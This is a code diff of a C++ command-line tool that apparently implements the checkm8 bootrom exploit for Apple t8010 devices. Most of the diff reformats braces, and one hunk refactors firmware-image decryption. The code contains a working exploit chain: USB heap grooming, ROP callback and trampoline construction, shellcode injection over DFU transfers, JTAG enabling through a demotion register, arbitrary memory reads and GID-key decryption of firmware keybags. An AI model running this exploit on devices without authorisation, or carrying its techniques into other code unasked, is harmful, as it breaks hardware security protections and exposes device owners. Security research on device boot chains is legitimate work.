@@ -26,7 +26,8 @@ using namespace tihmstar::img4tool;
 
 typedef vector<uint8_t> V8;
 
-enum class ECOMMAND {
+enum class ECOMMAND
+{
   EXIT = 0,
   CHECKM8,
   DEMOTE,
@@ -40,7 +41,8 @@ const int PAYLOAD_SIZE_ARMV7 = 320;
 const int PAYLOAD_OFFSET_ARM64 = 384;
 const int PAYLOAD_SIZE_ARM64 = 576;
 
-typedef struct _DeviceConfig {
+typedef struct _DeviceConfig
+{
   std::string version;
   int cpid;
   int large_leak;
@@ -56,7 +58,8 @@ typedef struct _DeviceConfig {
         leak(leak) {}
 } DeviceConfig;
 
-typedef struct _Callback {
+typedef struct _Callback
+{
   uint64_t FunctionAddress;
   uint64_t CallbackAddress;
 
@@ -65,10 +68,12 @@ typedef struct _Callback {
 
 } Callback;
 
-std::vector<uint8_t> HexToBytes(const std::string &hex) {
+std::vector<uint8_t> HexToBytes(const std::string &hex)
+{
   std::vector<uint8_t> bytes;
 
-  for (unsigned int i = 0; i < hex.length(); i += 2) {
+  for (unsigned int i = 0; i < hex.length(); i += 2)
+  {
     std::string byteString = hex.substr(i, 2);
     char byte = (char)strtol(byteString.c_str(), NULL, 16);
     bytes.push_back(byte);
@@ -92,31 +97,40 @@ void sleep_ms(int milliseconds) // cross-platform sleep function
 }
 
 vector<uint8_t> usb_rop_callbacks(uint64_t address, uint64_t func_gadget,
-                                  vector<Callback> callbacks) {
+                                  vector<Callback> callbacks)
+{
   vector<uint64_t> data;
 
-  for (int i = 0; i < callbacks.size(); i += 5) {
+  for (int i = 0; i < callbacks.size(); i += 5)
+  {
     vector<uint64_t> block1;
     vector<uint64_t> block2;
 
-    for (int j = 0; j < 5; j++) {
+    for (int j = 0; j < 5; j++)
+    {
       address += 0x10;
 
-      if (j == 4) {
+      if (j == 4)
+      {
         address += 0x50;
       }
 
-      if ((i + j) < callbacks.size() - 1) {
+      if ((i + j) < callbacks.size() - 1)
+      {
         block1.push_back(func_gadget);
         block1.push_back(address);
         block2.push_back(callbacks[i + j].CallbackAddress);
         block2.push_back(callbacks[i + j].FunctionAddress);
-      } else if ((i + j) == callbacks.size() - 1) {
+      }
+      else if ((i + j) == callbacks.size() - 1)
+      {
         block1.push_back(func_gadget);
         block1.push_back(0);
         block2.push_back(callbacks[i + j].CallbackAddress);
         block2.push_back(callbacks[i + j].FunctionAddress);
-      } else {
+      }
+      else
+      {
         block1.push_back(0);
         block1.push_back(0);
       }
@@ -133,11 +147,15 @@ vector<uint8_t> usb_rop_callbacks(uint64_t address, uint64_t func_gadget,
 }
 
 // # TODO: assert we are within limits
-uint32_t asm_arm64_branch(uint64_t src, uint64_t dest) {
+uint32_t asm_arm64_branch(uint64_t src, uint64_t dest)
+{
   uint32_t value;
-  if (src > dest) {
+  if (src > dest)
+  {
     value = (uint32_t)(0x18000000 - (src - dest) / 4);
-  } else {
+  }
+  else
+  {
     value = (uint32_t)(0x14000000 + (dest - src) / 4);
   }
   return value;
@@ -145,7 +163,8 @@ uint32_t asm_arm64_branch(uint64_t src, uint64_t dest) {
 
 // # TODO: check if start offset % 4 would break it
 // # LDR X7, [PC, #OFFSET]; BR X7
-vector<uint8_t> asm_arm64_x7_trampoline(uint64_t dest) {
+vector<uint8_t> asm_arm64_x7_trampoline(uint64_t dest)
+{
   vector<uint8_t> Trampoline = {0x47, 0x00, 0x00, 0x58, 0xE0, 0x00, 0x1F, 0xD6};
   Trampoline.insert(Trampoline.end(), (uint8_t *)&dest,
                     ((uint8_t *)&dest) + sizeof(uint64_t));
@@ -154,13 +173,19 @@ vector<uint8_t> asm_arm64_x7_trampoline(uint64_t dest) {
 }
 
 vector<uint8_t> prepare_shellcode(std::string name,
-                                  vector<uint64_t> &constants) {
+                                  vector<uint64_t> &constants)
+{
   int size = 0;
-  if (name.find("_armv7") != string::npos) {
+  if (name.find("_armv7") != string::npos)
+  {
     size = 4;
-  } else if (name.find("_arm64") != string::npos) {
+  }
+  else if (name.find("_arm64") != string::npos)
+  {
     size = 8;
-  } else {
+  }
+  else
+  {
     cout << "[!] Unknown shellcode name: " << name << "\n";
     exit(0);
   }
@@ -168,7 +193,8 @@ vector<uint8_t> prepare_shellcode(std::string name,
   // Read file
   string filename = "bin/" + name + ".bin";
   ifstream f(filename, ios::binary | ios::in);
-  if (f.is_open() == false) {
+  if (f.is_open() == false)
+  {
     cout << "[!] Could not open binary file: '" << filename << "'\n";
     exit(0);
   }
@@ -186,7 +212,8 @@ vector<uint8_t> prepare_shellcode(std::string name,
   //  Shellcode has placeholder values for constants; check they match and
   //  replace with constants from config
   uint64_t placeholders_offset = shellcode.size() - size * constants.size();
-  for (int i = 0; i < constants.size(); i++) {
+  for (int i = 0; i < constants.size(); i++)
+  {
     uint64_t offset = placeholders_offset + size * i;
     uint64_t value = 0;
     if (size == 8)
@@ -206,7 +233,8 @@ vector<uint8_t> prepare_shellcode(std::string name,
 /*
         Generate shellcode for the t8010
 */
-vector<uint8_t> getT8010Shellcode() {
+vector<uint8_t> getT8010Shellcode()
+{
   vector<uint8_t> Shellcode;
 
   vector<uint64_t> constants_usb_t8010 = {
@@ -323,7 +351,8 @@ vector<uint8_t> getT8010Shellcode() {
 }
 
 #pragma pack(1)
-typedef struct alignas(1) {
+typedef struct alignas(1)
+{
   uint8_t temp0[0x580] = {0};
   uint8_t temp1[32] = {0};
   uint64_t t8010_nop_gadget0 = 0x10000CC6C;
@@ -334,7 +363,8 @@ typedef struct alignas(1) {
   uint32_t End = 0xbeefbeef;
 } t8010_overwrite;
 
-void runCheckm8() {
+void runCheckm8()
+{
   // Create device config
   t8010_overwrite Overwrite;
   assert(sizeof(t8010_overwrite) == 1524);
@@ -347,12 +377,14 @@ void runCheckm8() {
 
   // Run exploit (t8010 specific)
   DFU D;
-  if (!D.acquire_device()) {
+  if (!D.acquire_device())
+  {
     printf("[!] Failed to find device!\n");
     return;
   }
 
-  if (D.isExploited()) {
+  if (D.isExploited())
+  {
     printf("[!] Device is already exploited! Aborting!\n");
     return;
   }
@@ -360,7 +392,8 @@ void runCheckm8() {
   printf("[*] stage 1, heap grooming ...\n");
 
   D.stall();
-  for (int i = 0; i < DC_t8010.hole; i++) {
+  for (int i = 0; i < DC_t8010.hole; i++)
+  {
     D.no_leak();
   }
   D.usb_req_leak();
@@ -384,15 +417,18 @@ void runCheckm8() {
   D.acquire_device();
   D.usb_req_stall();
 
-  for (int i = 0; i < DC_t8010.leak; i++) {
+  for (int i = 0; i < DC_t8010.leak; i++)
+  {
     D.usb_req_leak();
   }
   D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, DC_t8010.overwrite,
                                    DC_t8010.overwrite_size, 100);
 
-  for (int i = 0; i < Shellcode.size(); i += 0x800) {
+  for (int i = 0; i < Shellcode.size(); i += 0x800)
+  {
     int Size = 0x800;
-    if ((Size + i) > Shellcode.size()) {
+    if ((Size + i) > Shellcode.size())
+    {
       Size = Shellcode.size() - i;
     }
     D.libusb1_no_error_ctrl_transfer(0x21, 1, 0, 0, Shellcode.data() + i, Size,
@@ -409,18 +445,23 @@ void runCheckm8() {
   // Check if device is pwned ...
   D.acquire_device();
   // Check serial number string here!
-  if (D.isExploited()) {
+  if (D.isExploited())
+  {
     printf("[!] Device is now in pwned DFU Mode! :D\n");
-  } else {
+  }
+  else
+  {
     printf("[!] Exploit failed! :(\n");
   }
   D.release_device();
 }
 
-void demoteDevice() {
+void demoteDevice()
+{
   DFU d;
   d.acquire_device();
-  if (d.isExploited() == false) {
+  if (d.isExploited() == false)
+  {
     cout << "[!] Device has to be exploited first!\n";
     return;
   }
@@ -440,17 +481,22 @@ void demoteDevice() {
 
   uint32_t NewValue = U.read_memory_uint32(U.getDemotionReg());
   printf("[*] New DemotionReg: %X\n", NewValue);
-  if (NewValue == Value) {
+  if (NewValue == Value)
+  {
     cout << "[!] Failed to enable the JTAG!\n";
-  } else {
+  }
+  else
+  {
     cout << "[!] Succeeded to enable the JTAG!\n";
   }
 }
 
-void read32(uint64_t address) {
+void read32(uint64_t address)
+{
   DFU d;
   d.acquire_device();
-  if (d.isExploited() == false) {
+  if (d.isExploited() == false)
+  {
     cout << "[!] Device has to be exploited first!\n";
     return;
   }
@@ -466,10 +512,12 @@ void read32(uint64_t address) {
   printf("[*] [%lX] = %08X\n", address, Value);
 }
 
-void read64(uint64_t address) {
+void read64(uint64_t address)
+{
   DFU d;
   d.acquire_device();
-  if (d.isExploited() == false) {
+  if (d.isExploited() == false)
+  {
     cout << "[!] Device has to be exploited first!\n";
     return;
   }
@@ -485,11 +533,27 @@ void read64(uint64_t address) {
   printf("[*] [%lX] = %016lX\n", address, Value);
 }
 
-void decryptIMG4(std::string FileName, std::string DecryptedKeyBag) {
+void writeFile(std::string FileName, const uint8_t *Data, size_t Size)
+{
+  ofstream fo(FileName + "_decrypted", ios::binary | ios::out);
+  if (fo.is_open() == false)
+  {
+    cout << "[!] Could not open binary file: '" << FileName << "'\n";
+    exit(0);
+  }
+  fo.write((const char *)Data, Size);
+  fo.close();
+
+  cout << "[!] File succesfully decrypted and written to: " + FileName + "_decrypted" + "\n";
+}
+
+void decryptIMG4(std::string FileName, std::string DecryptedKeyBag)
+{
   cout << "decryptIMG4\n";
   // Open file
   ifstream f(FileName, ios::binary | ios::in);
-  if (f.is_open() == false) {
+  if (f.is_open() == false)
+  {
     cout << "[!] Could not open binary file: '" << FileName << "'\n";
     exit(0);
   }
@@ -507,107 +571,109 @@ void decryptIMG4(std::string FileName, std::string DecryptedKeyBag) {
   // Print info and get Keybags
   vector<string> KeyBags;
   auto seqName = getNameForSequence(workingBuffer.data(), workingBuffer.size());
-  if (seqName == "IM4P") {
+  if (seqName == "IM4P")
+  {
     printIM4P(workingBuffer.data(), workingBuffer.size(), KeyBags);
-  } else {
-    printf("File not recognised");
+  }
+  else
+  {
+    printf("[!] File not recognised!\n");
     exit(0);
   }
 
   // Combine keybag
-  if (KeyBags.size() < 2) {
-    cout << "[!] Could not retrieve keybag!\n";
-    exit(0);
-  }
-
-  std::vector<uint8_t> KeyBag1;
-  append(KeyBag1, (uint8_t *)KeyBags[0].data(), KeyBags[0].size());
-  append(KeyBag1, (uint8_t *)KeyBags[1].data(), KeyBags[1].size());
-
-  // Decrypt keybag
-  std::vector<uint8_t> DecryptedKeyBag1;
-  DecryptedKeyBag1 = HexToBytes(DecryptedKeyBag);
-  if (DecryptedKeyBag.size() == 0) {
-    DFU d;
-    d.acquire_device();
-    if (d.isExploited() == false) {
-      cout << "[!] Device has to be exploited first!\n";
-      return;
-    }
-
-    // Get serial number
-    auto SerialNumber = d.getSerialNumber();
-    d.release_device();
-
-    // Decrypt GID
-    USBEXEC U(SerialNumber);
-    U.aes(KeyBag1, AES_DECRYPT, AES_GID_KEY, DecryptedKeyBag1);
-  }
-
-  cout << "[*] Decrypted Keybag: \n";
-  for (int i = 0; i < DecryptedKeyBag1.size(); i++) {
-    printf("%02X", DecryptedKeyBag1[i]);
-  }
-  printf("\n");
-
-  // Parse keybag
-  V8 Key, IV;
-  if (DecryptedKeyBag1.size() != 32 + 16) {
-    cout << "[!] Wrong decrypted keybag size. Expected size == 96 bytes!\n";
-    exit(0);
-  }
-
-  append(IV, DecryptedKeyBag1.data(), 16);
-  append(Key, DecryptedKeyBag1.data() + 16, 32);
-
-  cout << "[*] Decrypted Key: \n";
-  for (int i = 0; i < Key.size(); i++) {
-    printf("%02X", Key[i]);
-  }
-  printf("\n");
-
-  cout << "[*] Decrypted IV: \n";
-  for (int i = 0; i < IV.size(); i++) {
-    printf("%02X", IV[i]);
-  }
-  printf("\n");
-
-  // Decrypt image
   ASN1DERElement file(workingBuffer.data(), workingBuffer.size());
-  // ASN1DERElement payload = getPayloadFromIM4P(file, IV.data(), Key.data());
-
-  // TODO
-
   ASN1DERElement payload = file[3];
   assert(!payload.tag().isConstructed);
   assert(payload.tag().tagNumber == ASN1DERElement::TagOCTET);
   assert(payload.tag().tagClass == ASN1DERElement::TagClass::Universal);
 
   ASN1DERElement decPayload(payload);
+  if (KeyBags.size() < 2)
+  {
+    cout << "[!] Could not retrieve keybag! Extracting payload ...\n";
+    auto finished = unpackKernelIfNeeded(decPayload);
 
-  // AES decrypt
-  struct AES_ctx ctx;
-  AES_init_ctx_iv(&ctx, Key.data(), IV.data());
-  AES_CBC_decrypt_buffer(&ctx, (uint8_t *)decPayload.payload(),
-                         decPayload.payloadSize());
-
-  ASN1DERElement finished = unpackKernelIfNeeded(decPayload);
-
-  // Dump
-  ofstream fo(FileName + "_decrypted", ios::binary | ios::out);
-  if (fo.is_open() == false) {
-    cout << "[!] Could not open binary file: '" << FileName << "'\n";
-    exit(0);
+    writeFile(FileName, (const uint8_t *)finished.payload(), finished.payloadSize());
   }
+  else
+  {
+    std::vector<uint8_t> KeyBag1;
+    append(KeyBag1, (uint8_t *)KeyBags[0].data(), KeyBags[0].size());
+    append(KeyBag1, (uint8_t *)KeyBags[1].data(), KeyBags[1].size());
 
-  fo.write((const char *)finished.payload(), finished.payloadSize());
-  f.close();
+    // Decrypt keybag
+    std::vector<uint8_t> DecryptedKeyBag1;
+    DecryptedKeyBag1 = HexToBytes(DecryptedKeyBag);
+    if (DecryptedKeyBag.size() == 0)
+    {
+      DFU d;
+      d.acquire_device();
+      if (d.isExploited() == false)
+      {
+        cout << "[!] Device has to be exploited first!\n";
+        return;
+      }
+
+      // Get serial number
+      auto SerialNumber = d.getSerialNumber();
+      d.release_device();
+
+      // Decrypt GID
+      USBEXEC U(SerialNumber);
+      U.aes(KeyBag1, AES_DECRYPT, AES_GID_KEY, DecryptedKeyBag1);
+    }
+
+    cout << "[*] Decrypted Keybag: \n";
+    for (int i = 0; i < DecryptedKeyBag1.size(); i++)
+    {
+      printf("%02X", DecryptedKeyBag1[i]);
+    }
+    printf("\n");
+
+    // Parse keybag
+    V8 Key, IV;
+    if (DecryptedKeyBag1.size() != 32 + 16)
+    {
+      cout << "[!] Wrong decrypted keybag size. Expected size == 96 bytes!\n";
+      exit(0);
+    }
+
+    append(IV, DecryptedKeyBag1.data(), 16);
+    append(Key, DecryptedKeyBag1.data() + 16, 32);
+
+    cout << "[*] Decrypted Key: \n";
+    for (int i = 0; i < Key.size(); i++)
+    {
+      printf("%02X", Key[i]);
+    }
+    printf("\n");
+
+    cout << "[*] Decrypted IV: \n";
+    for (int i = 0; i < IV.size(); i++)
+    {
+      printf("%02X", IV[i]);
+    }
+    printf("\n");
+
+    // AES decrypt
+    struct AES_ctx ctx;
+    AES_init_ctx_iv(&ctx, Key.data(), IV.data());
+    AES_CBC_decrypt_buffer(&ctx, (uint8_t *)decPayload.payload(),
+                           decPayload.payloadSize());
+
+    auto finished = unpackKernelIfNeeded(decPayload);
+
+    writeFile(FileName, (const uint8_t *)finished.payload(), finished.payloadSize());
+  }
 
   cout << "[!] File succesfully decrypted and written to: " + FileName + "_decrypted" + "\n";
 }
 
-ECOMMAND parseCommandLine(int argc, char *argv[]) {
-  if (argc < 2) {
+ECOMMAND parseCommandLine(int argc, char *argv[])
+{
+  if (argc < 2)
+  {
     cout << "Usage:\n";
     cout << "checkm8                                         - execute checkm8 "
             "exploit\n";
@@ -632,20 +698,28 @@ ECOMMAND parseCommandLine(int argc, char *argv[]) {
     return ECOMMAND::CHECKM8;
   else if (Command == "enable_jtag")
     return ECOMMAND::DEMOTE;
-  else if (Command == "read32") {
-    if (argc < 3) {
+  else if (Command == "read32")
+  {
+    if (argc < 3)
+    {
       cout << "[!] No address supplied!\n";
       return ECOMMAND::EXIT;
     }
     return ECOMMAND::READ_U32;
-  } else if (Command == "read64") {
-    if (argc < 3) {
+  }
+  else if (Command == "read64")
+  {
+    if (argc < 3)
+    {
       cout << "[!] No address supplied!\n";
       return ECOMMAND::EXIT;
     }
     return ECOMMAND::READ_U64;
-  } else if (Command == "decryptIMG") {
-    if (argc < 3) {
+  }
+  else if (Command == "decryptIMG")
+  {
+    if (argc < 3)
+    {
       cout << "[!] No filename supplied!\n";
       return ECOMMAND::EXIT;
     }
@@ -657,9 +731,11 @@ ECOMMAND parseCommandLine(int argc, char *argv[]) {
   return ECOMMAND::EXIT;
 }
 
-int main(int argc, char *argv[]) {
+int main(int argc, char *argv[])
+{
   ECOMMAND C = parseCommandLine(argc, argv);
-  switch (C) {
+  switch (C)
+  {
   case ECOMMAND::EXIT:
     return 0;
     break;
@@ -669,22 +745,29 @@ int main(int argc, char *argv[]) {
   case ECOMMAND::DEMOTE:
     demoteDevice();
     break;
-  case ECOMMAND::READ_U32: {
+  case ECOMMAND::READ_U32:
+  {
     uint64_t address = strtoul(argv[2], 0, 0);
     read32(address);
-  } break;
-  case ECOMMAND::READ_U64: {
+  }
+  break;
+  case ECOMMAND::READ_U64:
+  {
     uint64_t address = strtoul(argv[2], 0, 0);
     read64(address);
-  } break;
-  case ECOMMAND::DECRYPT_IMG4: {
+  }
+  break;
+  case ECOMMAND::DECRYPT_IMG4:
+  {
     std::string FileName = argv[2];
     std::string DecryptedKeybag = "";
-    if (argc > 3) {
+    if (argc > 3)
+    {
       DecryptedKeybag = argv[3];
     }
     decryptIMG4(FileName, DecryptedKeybag);
-  } break;
+  }
+  break;
   default:
     // Do nothing
     break;
